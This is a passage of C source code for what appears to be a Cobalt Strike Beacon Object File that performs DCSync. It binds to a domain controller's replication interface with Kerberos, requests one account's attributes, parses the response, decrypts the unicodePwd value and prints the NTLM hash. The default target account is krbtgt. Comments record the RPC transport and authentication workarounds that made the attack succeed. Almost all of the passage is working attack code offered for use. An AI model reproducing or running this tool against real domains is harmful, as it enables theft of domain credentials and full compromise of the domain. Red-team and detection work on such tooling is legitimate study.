    ndr_rskip(pos, 4);  /* NameLen */
    DWORD strBytes = mc * 2;
    ndr_rskip(pos, strBytes);
    ndr_ralign(pos, 4);
}

/*
 * Skip UPTODATE_VECTOR_V2_EXT (conformant struct).
 */
static void skip_uptodatevec(const BYTE *buf, DWORD *pos, DWORD len)
{
    DWORD mc = ndr_r32(buf, pos, len); /* max_count for rgCursors */
    ndr_rskip(pos, 4);  /* dwVersion */
    ndr_rskip(pos, 4);  /* dwReserved */
    ndr_rskip(pos, 4);  /* cNumCursors */
    /* Each UPTODATE_CURSOR_V2 = UUID(16) + USN(8) + DSTIME(8) = 32 */
    ndr_rskip(pos, mc * 32);
}

/*
 * Skip PROPERTY_META_DATA_EXT_VECTOR (conformant struct).
 */
static void skip_metadata(const BYTE *buf, DWORD *pos, DWORD len)
{
    DWORD mc = ndr_r32(buf, pos, len); /* max_count for rgMetaData */
    ndr_rskip(pos, 4);  /* cNumProps */
    /* Each PROPERTY_META_DATA_EXT:
       dwVersion(4) + timeChanged(8) + uuidDsaOriginating(16) +
       usnOriginating(8) = 36 bytes, but aligned to 8 → 40? */
    /* Actually: DWORD(4) + LONGLONG(8) + UUID(16) + LONGLONG(8) = 36
       With alignment: DWORD at 0, pad to 8, LONGLONG at 8,
       UUID at 16, LONGLONG at 32 → 40 bytes per entry */
    ndr_rskip(pos, mc * 40);
}

/*
 * Parse the ATTR array to extract target attributes.
 *
 * The ATTR array is pointed to by AttrBlock.pAttr.
 * Wire format:
 *   max_count (4)
 *   ATTR[i]: attrTyp(4) + valCount(4) + pAVal_ref(4)  (12 per entry)
 *   deferred ATTRVAL arrays for each ATTR
 *     For each ATTR with pAVal != 0:
 *       max_count (4) = valCount
 *       ATTRVAL[j]: valLen(4) + pVal_ref(4)  (8 per entry)
 *       deferred pVal data for each ATTRVAL:
 *         max_count (4) = valLen
 *         data (valLen bytes)
 *         pad to 4
 */
static void parse_attr_array(const BYTE *buf, DWORD *pos, DWORD len,
                             DWORD adPrefixIdx, DCSYNC_RESULT *res)
{
    DWORD mc = ndr_r32(buf, pos, len); /* max_count = attrCount */
    if (mc > 500) mc = 500; /* sanity cap */

    /* Read ATTR entries: we need attrTyp and valCount per entry */
    /* Store in stack arrays — 500 * 12 = 6000 bytes would be too much.
       Process in chunks or just keep what we need. */
    /* Simpler: track target ATTYPs inline */
    DWORD attPwd  = ((DWORD)adPrefixIdx << 16) | ATTV_UNICODE_PWD;
    DWORD attName = ((DWORD)adPrefixIdx << 16) | ATTV_SAM_ACCOUNT_NAME;
    DWORD attSid  = ((DWORD)adPrefixIdx << 16) | ATTV_OBJECT_SID;
    DWORD attUac  = ((DWORD)adPrefixIdx << 16) | ATTV_USER_ACCOUNT_CTRL;

    /* First pass: read all ATTR headers, record which have interesting types */
    /* We need to process deferred data for ALL attrs (even uninteresting ones)
       because the wire is sequential. We'll just save data for interesting ones.

       Strategy: two-pass per attr.
       Pass 1: read all ATTR headers into a small table.
       Pass 2: process deferred ATTRVAL data, picking out interesting values.

       For up to 500 attrs, we need 500 × 12 bytes on stack = 6KB.
       That's over 4KB.  Use a smaller cap or avoid storing all. */

    /* Alternative: process inline.  Read all ATTR headers, then process
       deferred data in the same order.  We only save the attrTyp to know
       which deferred value to capture. */

    /* We'll use two arrays of DWORD: types[128] and valCounts[128].
       128 × 8 = 1024 bytes.  If mc > 128 we overflow — but typical
       user objects have ~30-50 attrs. */

    DWORD types[128], vcnts[128], arefs[128];
    DWORD n = mc < 128 ? mc : 128;

    for (DWORD i = 0; i < n; i++) {
        types[i] = ndr_r32(buf, pos, len);  /* attrTyp */
        vcnts[i] = ndr_r32(buf, pos, len);  /* valCount */
        arefs[i] = ndr_r32(buf, pos, len);  /* pAVal ref */
    }
    /* skip overflow entries */
    for (DWORD i = n; i < mc; i++) ndr_rskip(pos, 12);

    /* Deferred ATTRVAL data — in order of ATTR entries */
    for (DWORD i = 0; i < mc; i++) {
        DWORD atyp  = (i < n) ? types[i] : 0;
        DWORD vcnt  = (i < n) ? vcnts[i] : 0;
        DWORD aref  = (i < n) ? arefs[i] : 0;

        /* If attrs beyond our 128 cap, we still need to skip their wire data.
           Read values from wire if we have no header info. */
        if (i >= n) {
            /* We don't have the header.  But the deferred data only appears
               for non-NULL pAVal.  Without the ref, we can't know.
               This is a problem.  For now, if mc > 128 we'll break early
               and accept that some attrs might be missed. */
            break;
        }

        if (aref == 0) continue; /* NULL pAVal → no values */

        /* ATTRVAL conformant array */
        DWORD vmc = ndr_r32(buf, pos, len);
        DWORD vc = vmc < vcnt ? vmc : vcnt;
        if (vc > 100) vc = 100; /* sanity */

        /* Read ATTRVAL headers */
        DWORD vlens[32], vrefs[32];
        DWORD vn = vc < 32 ? vc : 32;
        for (DWORD j = 0; j < vn; j++) {
            vlens[j] = ndr_r32(buf, pos, len);
            vrefs[j] = ndr_r32(buf, pos, len);
        }
        for (DWORD j = vn; j < vc; j++) ndr_rskip(pos, 8);

        /* Deferred pVal data */
        for (DWORD j = 0; j < vc; j++) {
            DWORD vl = (j < vn) ? vlens[j] : 0;
            DWORD vr = (j < vn) ? vrefs[j] : 0;
            if (j >= vn || vr == 0) continue;

            DWORD pmc = ndr_r32(buf, pos, len); /* max_count = valLen */
            DWORD dataLen = pmc < vl ? pmc : vl;

            /* Check if this is an interesting attribute */
            if (atyp == attPwd && !res->havePwd && dataLen <= 64) {
                ndr_rbytes(buf, pos, len, res->encPwd, dataLen);
                res->encPwdLen = dataLen;
                res->havePwd = 1;
            } else if (atyp == attName && !res->haveName && dataLen > 0) {
                /* sAMAccountName is UTF-16LE.  Convert to narrow. */
                DWORD copyLen = dataLen < 254 ? dataLen : 254;
                if (*pos + copyLen <= len) {
                    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
                        (LPCWCH)(buf + *pos), copyLen / 2,
                        res->samName, 127, NULL, NULL);
                    res->haveName = 1;
                }
                ndr_rskip(pos, dataLen);
            } else if (atyp == attSid && !res->haveSid && dataLen <= 68) {
                ndr_rbytes(buf, pos, len, res->objectSid, dataLen);
                res->sidLen = dataLen;
                res->haveSid = 1;
            } else if (atyp == attUac && !res->haveUac && dataLen >= 4) {
                res->uac = *(DWORD*)(buf + *pos);
                res->haveUac = 1;
                ndr_rskip(pos, dataLen);
            } else {
                ndr_rskip(pos, dataLen);
            }
            ndr_ralign(pos, 4);
        }
    }
}

/* ================================================================
 *  SECTION 11 — PARSE FULL GETNC RESPONSE
 * ================================================================ */

/*
 * Response wire layout:
 *   pdwOutVersion           4 bytes
 *   padding to 8            4 bytes
 *   union_discrim           4 bytes
 *   padding to arm align    4 bytes
 *   V6 body               128 bytes
 *   deferred: pNC, pUpToDateVecSrc, PrefixTableSrc.pPrefixEntry, pObjects
 *   return value            4 bytes (at end)
 */
static int parse_getnc_resp(const BYTE *buf, DWORD len, DCSYNC_RESULT *res)
{
    DWORD p = 0;

    /* pdwOutVersion */
    DWORD outVer = ndr_r32(buf, &p, len);

    /* align union to 8 */
    ndr_ralign(&p, 8);

    /* union discriminant */
    DWORD disc = ndr_r32(buf, &p, len);
    if (disc != 6 || outVer != 6) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Unexpected reply version: outVer=%u disc=%u (expected 6)\n",
            outVer, disc);
        return 0;
    }

    /* Arm padding to 8 */
    ndr_ralign(&p, 8);

    /* ── V6 body (128 bytes) ── */

    /* +0: uuidDsaObjSrc (16) */
    ndr_rskip(&p, 16);
    /* +16: uuidInvocIdSrc (16) */
    ndr_rskip(&p, 16);
    /* +32: pNC ref */
    DWORD pNCRef = ndr_r32(buf, &p, len);
    /* align to 8 for USN_VECTOR */
    ndr_ralign(&p, 8);
    /* +40: usnvecFrom (24) */
    ndr_rskip(&p, 24);
    /* +64: usnvecTo (24) */
    ndr_rskip(&p, 24);
    /* +88: pUpToDateVecSrc ref */
    DWORD pUTDRef = ndr_r32(buf, &p, len);
    /* +92: PrefixTableSrc.PrefixCount */
    DWORD pfxCount = ndr_r32(buf, &p, len);
    /* +96: PrefixTableSrc.pPrefixEntry ref */
    DWORD pfxRef = ndr_r32(buf, &p, len);
    /* +100: ulExtendedRet (skip) */
    ndr_rskip(&p, 4);
    /* +104: cNumObjects */
    DWORD nObj = ndr_r32(buf, &p, len);
    /* +108: cNumBytes */
    ndr_rskip(&p, 4);
    /* +112: pObjects ref */
    DWORD pObjRef = ndr_r32(buf, &p, len);
    /* +116: fMoreData */
    ndr_rskip(&p, 4);
    /* +120: cNumNcSizeObjects */
    ndr_rskip(&p, 4);
    /* +124: cNumNcSizeValues */
    ndr_rskip(&p, 4);
    /* V6 body end at p == v6 + 128 */

    /* Check DRSR return value — it's the LAST 4 bytes of the buffer */
    if (len >= 4) {
        DWORD retVal = *(DWORD*)(buf + len - 4);
        if (retVal != 0) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] DRSGetNCChanges returned error: %u\n", retVal);
            if (retVal == 8453)
                BeaconPrintf(CALLBACK_ERROR,
                    "[!] Access denied — need DS-Replication-Get-Changes-All\n");
            return 0;
        }
    }

    if (nObj == 0 || pObjRef == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No objects returned\n");
        return 0;
    }

    /* ── Deferred pointer data (in order) ── */

    /* 1. pNC — DSNAME */
    if (pNCRef) skip_dsname(buf, &p, len);

    /* 2. pUpToDateVecSrc — UPTODATE_VECTOR_V2_EXT */
    if (pUTDRef) skip_uptodatevec(buf, &p, len);

    /* 3. PrefixTableSrc.pPrefixEntry — OID_t array */
    int adIdx = -1;
    if (pfxRef) {
        adIdx = find_ad_prefix(buf, &p, len, pfxCount);
    }
    if (adIdx < 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] AD attribute prefix not found in prefix table\n");
        return 0;
    }

    /* 4. pObjects — REPLENTINFLIST */
    /* For EXOP_REPL_OBJ, there is exactly one node (pNextEntInf = NULL) */

    /* REPLENTINFLIST body (32 bytes):
         pNextEntInf ref (4)
         Entinf.pName ref (4)
         Entinf.ulFlags (4)
         Entinf.AttrBlock.attrCount (4)
         Entinf.AttrBlock.pAttr ref (4)
         fIsNCPrefix (4)
         pParentGuid ref (4)
         pMetaDataExt ref (4)
    */
    ndr_rskip(&p, 4);  /* pNextEntInf ref (NULL for single-object) */
    DWORD nameRef  = ndr_r32(buf, &p, len);
    ndr_rskip(&p, 4); /* ulFlags */
    DWORD attrCnt  = ndr_r32(buf, &p, len);
    DWORD attrRef  = ndr_r32(buf, &p, len);
    ndr_rskip(&p, 4); /* fIsNCPrefix */
    DWORD parentRef = ndr_r32(buf, &p, len);
    DWORD metaRef   = ndr_r32(buf, &p, len);

    /* Deferred data for REPLENTINFLIST (depth-first) */

    /* nextRef → next node (should be NULL for single-object) */
    /* if (nextRef) ... we don't handle linked lists */

    /* nameRef → DSNAME of the replicated object */
    if (nameRef) skip_dsname(buf, &p, len);

    /* attrRef → ATTR array */
    if (attrRef && attrCnt > 0) {
        parse_attr_array(buf, &p, len, (DWORD)adIdx, res);
    }

    /* parentRef → GUID */
    if (parentRef) ndr_rskip(&p, 16);

    /* metaRef → PROPERTY_META_DATA_EXT_VECTOR */
    if (metaRef) skip_metadata(buf, &p, len);

    return 1;
}

/* ================================================================
 *  SECTION 12 — HASH DECRYPTION
 * ================================================================ */

/*
 * Decrypt a replicated secret attribute.
 *
 * Format: [Salt 16 bytes] [Encrypted data N bytes]
 * Decryption:
 *   1. key = MD5(sessionKey || Salt)
 *   2. plaintext = RC4(key, encryptedData)
 *   3. plaintext = [CRC32 4 bytes] [actual secret]
 *
 * For unicodePwd: actual secret = 16-byte NTLM hash.
 * Total encPwd blob = 16 (salt) + 4 (crc) + 16 (hash) = 36 bytes.
 */
static int decrypt_hash(const BYTE *encBlob, DWORD encLen,
                        const BYTE *sessKey, DWORD sessKeyLen,
                        BYTE hashOut[16])
{
    if (encLen < 20) return 0; /* salt(16) + at least 4 bytes encrypted */

    const BYTE *salt = encBlob;
    DWORD cryptLen = encLen - 16;

    /* Derive RC4 key: MD5(sessionKey || salt) */
    BYTE rc4key[16];
    if (!md5_2(sessKey, sessKeyLen, salt, 16, rc4key)) return 0;

    /* Decrypt in a temp buffer (don't modify the original) */
    BYTE decBuf[48];
    if (cryptLen > 48) return 0; /* unexpected size */
    MSVCRT$memcpy(decBuf, encBlob + 16, cryptLen);
    rc4(rc4key, 16, decBuf, cryptLen);

    /* decBuf[0..3] = CRC32 checksum (skip verification for now) */
    /* decBuf[4..19] = NTLM hash */
    if (cryptLen < 20) return 0;
    MSVCRT$memcpy(hashOut, decBuf + 4, 16);
    return 1;
}

/* ================================================================
 *  SECTION 13 — ENTRY POINT
 * ================================================================ */

void go(char *args, int args_len)
{
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user   = BeaconDataExtract(&parser, NULL);
    char *dc     = BeaconDataExtract(&parser, NULL);
    int dump_all = BeaconDataInt(&parser);

    /* ── Auto-detect domain ── */
    wchar_t wDomain[256] = {0};
    char aDomain[256] = {0};
    if (domain && *domain) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
        MSVCRT$strncpy(aDomain, domain, 255);
    } else {
        DWORD sz = 256;
        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &sz);
        KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256,
                                      NULL, NULL);
    }

    /* ── Auto-discover DC ── */
    wchar_t wDC[256] = {0};
    char aDC[256] = {0};
    if (dc && *dc) {
        MSVCRT$strncpy(aDC, dc, 255);
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, dc, -1, wDC, 256);
    } else {
        void *dcInfo = NULL;
        if (NETAPI32$DsGetDcNameW(NULL, wDomain, NULL, NULL, 0, &dcInfo) == 0
            && dcInfo)
        {
            LPWSTR dcN = *(LPWSTR*)dcInfo;
            if (dcN) {
                if (dcN[0] == L'\\' && dcN[1] == L'\\') dcN += 2;
                int i = 0;
                while (dcN[i] && i < 255) { wDC[i] = dcN[i]; i++; }
                KERNEL32$WideCharToMultiByte(CP_UTF8, 0, dcN, -1,
                                              aDC, 255, NULL, NULL);
            }
            NETAPI32$NetApiBufferFree(dcInfo);
        }
    }
    if (!aDC[0]) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Cannot discover DC. Use --dc.\n");
        return;
    }

    /* ── Default target: krbtgt ── */
    char aUser[256] = "krbtgt";
    wchar_t wUser[256] = L"krbtgt";
    if (user && *user) {
        MSVCRT$strncpy(aUser, user, 255);
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, user, -1, wUser, 256);
    }

    if (dump_all) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] --all not yet implemented. Specify --user.\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] DCSync %s\\%s via %s\n",
                 aDomain, aUser, aDC);

    /* ── Step 1: DsBindW — validate connectivity ── */
    HANDLE hDs = NULL;
    DWORD r = NTDSAPI$DsBindW(wDC, wDomain, &hDs);
    if (r) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] DsBind failed: %u (check replication rights)\n", r);
        return;
    }

    /* ── Step 2: DsCrackNames — resolve user → GUID ── */
    wchar_t wNetBios[64] = {0};
    {
        int i = 0;
        while (wDomain[i] && wDomain[i] != L'.' && i < 63)
            { wNetBios[i] = wDomain[i]; i++; }
        for (int j = 0; wNetBios[j]; j++)
            if (wNetBios[j] >= L'a' && wNetBios[j] <= L'z')
                wNetBios[j] -= 32;
    }

    wchar_t nt4Name[512];
    MSVCRT$_snwprintf(nt4Name, 512, L"%s\\%s", wNetBios, wUser);

    LPCWSTR names[1] = { nt4Name };
    DS_NAME_RESULTW *crackDN = NULL;

    r = NTDSAPI$DsCrackNamesW(hDs, DS_NAME_NO_FLAGS,
        DS_NT4_ACCOUNT_NAME, DS_FQDN_1779_NAME,
        1, names, (void**)&crackDN);
    if (r || !crackDN || crackDN->cItems < 1 ||
        crackDN->rItems[0].status != 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Cannot resolve %s (err=%u)\n", aUser, r);
        if (crackDN) NTDSAPI$DsFreeNameResultW(crackDN);
        NTDSAPI$DsUnBindW(&hDs);
        return;
    }

    /* DN for display */
    char userDN[512] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
        crackDN->rItems[0].pName, -1, userDN, 511, NULL, NULL);

    /* Now resolve to GUID */
    DS_NAME_RESULTW *crackGuid = NULL;
    r = NTDSAPI$DsCrackNamesW(hDs, DS_NAME_NO_FLAGS,
        DS_NT4_ACCOUNT_NAME, DS_UNIQUE_ID_NAME,
        1, names, (void**)&crackGuid);
    if (r || !crackGuid || crackGuid->cItems < 1 ||
        crackGuid->rItems[0].status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Cannot resolve GUID for %s\n", aUser);
        NTDSAPI$DsFreeNameResultW(crackDN);
        if (crackGuid) NTDSAPI$DsFreeNameResultW(crackGuid);
        NTDSAPI$DsUnBindW(&hDs);
        return;
    }

    /* Parse GUID string → binary */
    char guidStr[128] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0,
        crackGuid->rItems[0].pName, -1, guidStr, 127, NULL, NULL);

    GUID objGuid;
    if (!parse_guid(guidStr, &objGuid)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Failed to parse GUID: %s\n", guidStr);
        NTDSAPI$DsFreeNameResultW(crackDN);
        NTDSAPI$DsFreeNameResultW(crackGuid);
        NTDSAPI$DsUnBindW(&hDs);
        return;
    }

    NTDSAPI$DsFreeNameResultW(crackDN);
    NTDSAPI$DsFreeNameResultW(crackGuid);
    NTDSAPI$DsUnBindW(&hDs);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Object GUID: %s\n", guidStr);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] DN: %s\n", userDN);

    /* ── Step 3: Create RPC binding to DRSUAPI ──
     *
     * Transport = ncacn_ip_tcp with FORCED KERBEROS.
     *
     * History of what did NOT work here and why:
     *
     *   ncacn_ip_tcp + RpcBindingBind — earlier failed with 0x6E4
     *     (RPC_S_UNKNOWN_IF). RpcBindingBind was the culprit (undocumented,
     *     picky about the interface struct). We removed RpcBindingBind
     *     and let the first authenticated I_RpcSendReceive drive the bind
     *     PDU, which fixes 0x6E4.
     *
     *   ncacn_np:\pipe\lsass + NEGOTIATE — 0x5 (ACCESS_DENIED) even for
     *     Domain Admins. The named-pipe transport short-circuits SPN
     *     lookup on the same-host case and prefers NTLM; local LSA
     *     refuses NTLM-to-itself (loopback-reflection defense).
     *
     *   ncalrpc + WINNT — DRSBind succeeds, but WINNT on ncalrpc is a
     *     token-passing fast path with NO queryable SSPI context, so
     *     I_RpcBindingInqSecurityContext returns 0x6A6 and we cannot
     *     get the session key required to decrypt unicodePwd.
     *
     *   ncalrpc + KERBEROS — refused with 0x6D3 (UNKNOWN_AUTHN_SERVICE)
     *     on LTSC-family DCs; Kerberos is often not registered on ncalrpc.
     *
     * ncacn_ip_tcp + KERBEROS is the combination that gives us BOTH a
     * working bind AND a real session key:
     *
     *   - TCP loopback (target IP == local IP) is a normal network flow
     *     for Kerberos — no NTLM anywhere in the picture, so no loopback-
     *     reflection block.
     *   - RpcEpResolveBinding queries EPM on the DC (port 135) for
     *     DRSUAPI's dynamic port.
     *   - KERBEROS with a real SPN (HOST/<dc_fqdn>) produces a full SSPI
     *     context; I_RpcBindingInqSecurityContext returns the session key
     *     we need to build the RC4 key that decrypts unicodePwd.
     */
    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: init_drsuapi_if\n");
    init_drsuapi_if();

    RPC_CSTR stringBinding = NULL;
    RPC_BINDING_HANDLE hRpc = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA (ncacn_ip_tcp:%s)\n", aDC);
    RPC_STATUS rpcSt = RPCRT4$RpcStringBindingComposeA(
        NULL, (RPC_CSTR)"ncacn_ip_tcp", (RPC_CSTR)aDC,
        NULL, NULL, &stringBinding);
    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x binding=%s\n",
                 rpcSt, stringBinding ? (char*)stringBinding : "(null)");
    if (rpcSt == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingFromStringBindingA\n");
        rpcSt = RPCRT4$RpcBindingFromStringBindingA(stringBinding, &hRpc);
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x hRpc=%p\n",
                     rpcSt, hRpc);
        RPCRT4$RpcStringFreeA(&stringBinding);
    }
    if (rpcSt == 0) {
        /* Resolve DRSUAPI's dynamic TCP port via the DC's endpoint
         * mapper (port 135). This is why previous ncacn_ip_tcp attempts
         * did NOT reach the DRSUAPI endpoint by themselves. */
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcEpResolveBinding (DRSUAPI on ncacn_ip_tcp)\n");
        rpcSt = RPCRT4$RpcEpResolveBinding(hRpc, (void*)&g_drsuapi_if);
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
    }
    if (rpcSt == 0) {
        /* PKT_PRIVACY is still required by the DRSUAPI ACL; over ALPC
         * this reduces to LPC-layer sealing (nearly free).  A QOS
         * struct raises impersonation from the default IDENTIFY to
         * IMPERSONATE — lsass' ACL check needs to be able to open
         * the caller's token to evaluate group membership, and
         * IDENTIFY does not grant that. */
        MY_RPC_SEC_QOS qos;
        MSVCRT$memset(&qos, 0, sizeof(qos));
        qos.Version           = 1;
        qos.Capabilities      = MY_RPC_C_QOS_CAPABILITIES_DEFAULT;
        qos.IdentityTracking  = MY_RPC_C_QOS_IDENTITY_STATIC;
        qos.ImpersonationType = MY_RPC_C_IMP_LEVEL_IMPERSONATE;

        /* Authn service on ncacn_ip_tcp:
         *
         *   KERBEROS (16) is what we NEED. Full SSPI: AcquireCreds
         *     picks the caller's TGT out of LSA, InitializeSecurityContext
         *     asks the KDC for a service ticket against HOST/<dc_fqdn>
         *     (the machine account, which is what lsass runs as), and
         *     the runtime attaches a real security context to the binding
         *     with a queryable session key. That session key is the input
         *     to MD5(sessionKey || salt) → RC4 key → decrypted unicodePwd.
         *     TCP loopback with Kerberos does NOT trigger the NTLM
         *     loopback-reflection block since NTLM is never in the picture.
         *
         *   NEGOTIATE (9) would work here on TCP but SPNEGO can decide to
         *     fall back to NTLM if Kerberos hits any snag (clock skew,
         *     SPN typo, missing TGT) — and NTLM back to lsass on this
         *     same host still gets refused. Kerberos-only removes that
         *     failure mode entirely.
         *
         *   WINNT (10 = NTLMSSP) on TCP = the loopback-reflection block. */
        char spn[256];
        DWORD spnLen = 0;
        {
            const char *host_prefix = "HOST/";
            DWORD prefLen = 5;
            DWORD dcLen = 0;
            while (aDC[dcLen] && dcLen < 250) dcLen++;
            MSVCRT$memcpy(spn, host_prefix, prefLen);
            MSVCRT$memcpy(spn + prefLen, aDC, dcLen);
            spn[prefLen + dcLen] = 0;
            spnLen = prefLen + dcLen;
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "[.] trace: RpcBindingSetAuthInfoExA (KERBEROS + IMPERSONATE, spn=%s)\n", spn);
        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, (RPC_CSTR)spn,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_KERBEROS,
            NULL, 0, &qos);
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);

        (void)spnLen;
    }
    if (rpcSt == 0) {
        /* Force connection + SSPI handshake now so the security context
         * lands on the binding object where I_RpcBindingInqSecurityContext
         * can find it. Without this, the Win8+ RPC runtime keeps the
         * context on a pooled connection and the inquiry returns 0x6A6.
         *
         * A failure here is not fatal for the DRSBind path itself — the
         * lazy handshake on the first I_RpcSendReceive still works —
         * but if this returns 0 we get the session key; if it returns
         * non-zero we lose only decryption, not the RPC call. */
        BeaconPrintf(CALLBACK_OUTPUT,
            "[.] trace: RpcBindingBind (force SSPI context onto binding)\n");
        RPC_STATUS bs = RPCRT4$RpcBindingBind(NULL, hRpc, (void*)&g_drsuapi_if);
        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   bs=0x%08x\n", bs);
        /* Do NOT propagate bs into rpcSt — we still want to try DRSBind
         * even if the eager bind failed. Session key may still be
         * populated after the first successful RPC call. */
    }
    if (rpcSt) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] RPC binding failed: 0x%08x\n", rpcSt);
        if (rpcSt == 1753) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!]   0x6D9 = EPT_S_NOT_REGISTERED. DRSUAPI is not\n"
                "[!]   registered on the DC's endpoint mapper. Check\n"
                "[!]   that port 135 is reachable and that lsass has\n"
                "[!]   registered its DRSUAPI endpoint (rare — this\n"
                "[!]   only happens on a broken/half-promoted DC).\n");
        }
        if (rpcSt == 1747) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!]   0x6D3 = RPC_S_UNKNOWN_AUTHN_SERVICE. Kerberos\n"
                "[!]   is not registered on this transport. Very\n"
                "[!]   unusual on a domain-joined DC; would suggest\n"
                "[!]   the machine has lost its domain trust.\n");
        }
        if (hRpc) RPCRT4$RpcBindingFree(&hRpc);
        return;
    }

    /* ── Step 4: DRSBind ── */
    BYTE ctxHandle[20];
    MSVCRT$memset(ctxHandle, 0, 20);

    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: drsr_bind (I_RpcGetBuffer + I_RpcSendReceive)\n");
    if (!drsr_bind(hRpc, ctxHandle)) {
        RPCRT4$RpcBindingFree(&hRpc);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] DRSBind OK\n");

    /* ── Step 5: Get session key ── */
    BYTE sessKey[64];
    DWORD sessKeyLen = 0;
    if (!get_session_key(hRpc, sessKey, &sessKeyLen)) {
        RPCRT4$RpcBindingFree(&hRpc);
        return;
    }

    /* ── Step 6: DRSGetNCChanges ── */
    BYTE reqBuf[256];
    DWORD reqLen = build_getnc_req(reqBuf, ctxHandle, &objGuid);

    MY_RPC_MSG msg;
    rpcSt = rpc_call(hRpc, DRSR_OPNUM_GETNC, reqBuf, reqLen, &msg);
    if (rpcSt) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] DRSGetNCChanges RPC failed: 0x%08x\n", rpcSt);
        RPCRT4$RpcBindingFree(&hRpc);
        return;
    }

    /* ── Step 7: Parse response ── */
    DCSYNC_RESULT res;
    MSVCRT$memset(&res, 0, sizeof(res));

    int ok = parse_getnc_resp((BYTE*)msg.Buffer, msg.BufferLength, &res);
    RPCRT4$I_RpcFreeBuffer(&msg);
    RPCRT4$RpcBindingFree(&hRpc);

    if (!ok) return;

    /* ── Step 8: Decrypt and output ── */
    if (!res.havePwd) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] unicodePwd attribute not found in response\n");
        return;
    }

    BYTE ntHash[16];
    if (!decrypt_hash(res.encPwd, res.encPwdLen, sessKey, sessKeyLen, ntHash)) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Hash decryption failed (AES encryption may be in use)\n");
        return;
    }

    /* Format output: domain\user:RID:LM:NT::: */
    char hexNt[33];
    to_hex(ntHash, 16, hexNt);

    DWORD rid = 0;
    if (res.haveSid) rid = rid_from_sid(res.objectSid, res.sidLen);

    const char *name = res.haveName ? res.samName : aUser;

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[+] %s\\%s:%u:aad3b435b51404eeaad3b435b51404ee:%s:::\n",
        aDomain, name, rid, hexNt);
}
